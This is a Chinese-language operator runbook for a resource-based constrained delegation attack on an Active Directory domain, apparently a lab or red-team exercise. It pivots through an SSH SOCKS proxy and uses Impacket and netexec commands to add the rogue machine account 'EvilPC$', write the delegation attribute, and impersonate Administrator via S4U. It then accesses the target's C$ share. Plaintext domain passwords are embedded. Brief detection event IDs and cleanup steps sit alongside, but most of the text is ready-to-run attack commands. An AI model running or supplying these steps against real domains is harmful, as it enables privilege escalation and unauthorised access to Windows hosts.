# RBCD Proxy Path（Kali/Impacket）— 無需在 Windows 端點執行任何程式

本文件為「代理版」最終確認的正確步驟，所有流量經 SSH 跳板的 SOCKS5 代理；Windows 端點不執行任何程式碼。

## 拓撲
- Kali（攻擊機）：172.31.44.17
- 跳板（Ubuntu）：10.0.1.173（允許 SSH、AllowTcpForwarding=yes）
- DC：10.0.0.206（sme-swp-w-ad.sme.local）
- 目標：EC2AMAZ-V903HM1.sme.local（IP 例：10.0.2.200）
- 網域：SME.LOCAL；攻擊者：aduser；機器帳號：EvilPC$

## 0) 代理與環境準備
- 建 SOCKS5 代理（在 Kali，需常駐）：
  ```bash
  ssh -i ~/.ssh/jump_ed25519 -N -D 1080 jump@10.0.1.173 -o ExitOnForwardFailure=yes
  ```
- 設定 proxychains4（只保留 1080，移除 9050）：
  ```bash
  sudo sed -i 's/^strict_chain/dynamic_chain/' /etc/proxychains4.conf
  sudo sed -i 's/^# proxy_dns/proxy_dns/' /etc/proxychains4.conf
  # 確保 ProxyList 僅有：
  # socks5 127.0.0.1 1080
  ```
- 驗證代理連通：
  ```bash
  proxychains4 nc -vz 10.0.0.206 88
  proxychains4 nc -vz 10.0.0.206 389
  proxychains4 nc -vz 10.0.0.206 445
  ```
- 修復 DNS（跳板/Kali 若無法解析 FQDN）：
  - systemd-resolved 指向 DC：
    ```bash
    sudo bash -lc 'printf "[Resolve]\nDNS=10.0.0.206\nDomains=sme.local\n" > /etc/systemd/resolved.conf'
    sudo systemctl restart systemd-resolved
    ```
  - 或臨時 /etc/hosts：
    ```bash
    echo "10.0.2.200 EC2AMAZ-V903HM1.sme.local" | sudo tee -a /etc/hosts
    ```
- Impacket（在 repo 根目錄；使用 venv 並安裝 editable）：
  ```bash
  cd /home/kali/tools/impacket
  source /home/kali/tools/impacket-venv/bin/activate
  python3 -m pip install -U pip setuptools wheel
  # 如遇 pkg_resources 缺失，降級 setuptools
  python3 -m pip install 'setuptools<70'
  python3 -m pip install -e .
  ```

環境：攻擊端 = Kali/Ubuntu（未加入網域）；目標 = Windows Server 2022（EC2AMAZ-V903HM1.sme.local）；網域 = SME.LOCAL；DC_IP = <DC_IP>

## 前置準備
- 設定 DNS 指向 DC：
  ```bash
  sudo sed -i '1inameserver <DC_IP>' /etc/resolv.conf
  ```
- 設定 Kerberos：
  ```bash
  sudo tee /etc/krb5.conf >/dev/null <<'EOF'
  [libdefaults]
    default_realm = SME.LOCAL
    dns_lookup_realm = true
    dns_lookup_kdc = true
    rdns = false
    ticket_lifetime = 10h
    forwardable = yes
  [domain_realm]
    .sme.local = SME.LOCAL
    sme.local = SME.LOCAL
  EOF
  ```
- 安裝 Impacket 與 netexec（或使用系統已有版本）：
  ```bash
  python3 -m pip install --upgrade pip
  python3 -m pip install impacket
  python3 -m pip install netexec
  ```
- 確保時間同步：
  ```bash
  sudo ntpdate <DC_IP> || true
  ```

## 路徑總覽
1. 檢查 MachineAccountQuota（MAQ）
2. 新增電腦帳號（EvilPC$）
3. 寫入 RBCD（授權 EvilPC$ → 目標）
4. 取得 Administrator 對 CIFS 的 TGS（S4U）並保存 ccache
5. 使用票據存取目標（SMB）

## 1) 檢查 MAQ（MachineAccountQuota）
```bash
proxychains4 nxc ldap <DC_FQDN> -u aduser -p 'N0viru$123' -d SME.LOCAL -M maq
```
- 觀察輸出中的 MachineAccountQuota 值（預設 10）。非 0 即可由一般使用者新增電腦帳號。

## 2) 新增電腦帳號（EvilPC$）
```bash
cd /home/kali/tools/impacket
proxychains4 python3 examples/addcomputer.py SME.LOCAL/aduser:'N0viru$123' \
  -method SAMR -computer-name 'EvilPC$' -computer-pass 'Passw0rd!123' -dc-ip <DC_IP>
```
- 成功後，EvilPC$ 成為網域中的工作站帳號，密碼已知。

## 3) 寫入 RBCD（授權 EvilPC$ 對目標主機）
```bash
cd /home/kali/tools/impacket
# LDAP/389（推薦；若要求簽名，改用 -k）
proxychains4 python3 examples/rbcd.py -dc-ip <DC_IP> \
  -delegate-from 'EvilPC$' -delegate-to 'EC2AMAZ-V903HM1$' \
  -action write SME.LOCAL/aduser:'N0viru$123'

# 若 DC 要求 LDAP 簽名/加密，改用 Kerberos SASL（389 + -k）：
proxychains4 python3 examples/getTGT.py 'SME.LOCAL/aduser:N0viru$123' -dc-ip <DC_IP>
export KRB5CCNAME=./aduser.ccache
proxychains4 python3 examples/rbcd.py -dc-ip <DC_IP> \
  -delegate-from 'EvilPC$' -delegate-to 'EC2AMAZ-V903HM1$' \
  -action write -k SME.LOCAL/aduser
```
- 這會修改目標電腦物件的 `msDS-AllowedToActOnBehalfOfOtherIdentity`，加入 EvilPC$ 的 SID。

## 4) S4U 取得 Administrator → CIFS 的 TGS（並輸出 ccache）
```bash
cd /home/kali/tools/impacket
# 先用 EvilPC$ 取得 TGT
proxychains4 python3 examples/getTGT.py 'SME.LOCAL/EvilPC$:Passw0rd!123' -dc-ip <DC_IP>
export KRB5CCNAME=./EvilPC$.ccache
# 以 EvilPC$ 執行 S4U2Self+S4U2Proxy 取 CIFS 票（SPN 必須用 FQDN）
proxychains4 python3 examples/getST.py -k \
  -spn cifs/EC2AMAZ-V903HM1.sme.local \
  -impersonate Administrator \
  -dc-ip <DC_IP> \
  'SME.LOCAL/EvilPC$'
# 服務票會保存為：Administrator@cifs_EC2AMAZ-V903HM1.sme.local@SME.LOCAL.ccache
export KRB5CCNAME="./Administrator@cifs_EC2AMAZ-V903HM1.sme.local@SME.LOCAL.ccache"
```
- 檢查票據：
  ```bash
  klist
  ```

## 5) 使用票據存取目標（SMB）
- 目標 445 連通性（必要時改用 IP）：
  ```bash
  proxychains4 nc -vz 10.0.2.200 445
  ```
- Impacket smbclient（連線走目標 IP；Kerberos 身分保留 FQDN）：
  ```bash
  proxychains4 python3 examples/smbclient.py -k -no-pass \
    -target-ip 10.0.2.200 SME.LOCAL/Administrator@EC2AMAZ-V903HM1.sme.local
  ```
- netexec（Kerberos kcache）：
  ```bash
  proxychains4 nxc smb EC2AMAZ-V903HM1.sme.local -u Administrator -k --use-kcache -d SME.LOCAL --get-file C$\\Windows\\System32\\drivers\\etc\\hosts ./hosts.txt
  ```

## EDR/事件驗證重點
- DC：5136（RBCD 屬性變更）、4769（S4U2Proxy 對 CIFS TGS）
- 目標端：4624（Type 3）登入、SMB 會話與檔案存取
- 攻擊端：僅網路互動，無 Windows 端點程式執行

## 清理（必做）
- 移除 RBCD：
  ```bash
  proxychains4 python3 examples/rbcd.py -dc-ip <DC_IP> \
    -delegate-to 'EC2AMAZ-V903HM1$' -action remove SME.LOCAL/aduser:'N0viru$123'
  ```
- 刪除 EvilPC$（Kali 方案，選一）：
  - BloodyAD：
    ```bash
    python3 -m pip install bloodyad
    bloodyAD --host <DC_IP> -d SME.LOCAL -u aduser -p 'N0viru$123' delete computer --name EvilPC$
    ```
  - 或改用 Windows/RSAT：
    ```powershell
    Remove-ADComputer -Identity "EvilPC$" -Confirm:$false
    ```
- 清除票據：
  ```bash
  kdestroy || true
  ```

## 失敗排查
- KDC_ERR_S_PRINCIPAL_UNKNOWN：SPN 錯誤；使用 `cifs/EC2AMAZ-V903HM1.sme.local`；`setspn -L EC2AMAZ-V903HM1` 驗證
- KDC_ERR_POLICY：加密政策限制；Impacket 以密碼計算金鑰即可，確保時間同步
- KRB_AP_ERR_SKEW：時間不同步；重新校時後重試
 - LDAPS 握手 EOF：改用 LDAP/389 或 389 + `-k`；修好 DC 憑證再用 `-use-ldaps`
 - 解析到 224.0.0.1：修 DNS 指向 DC 或用 /etc/hosts 映射到正確 IP
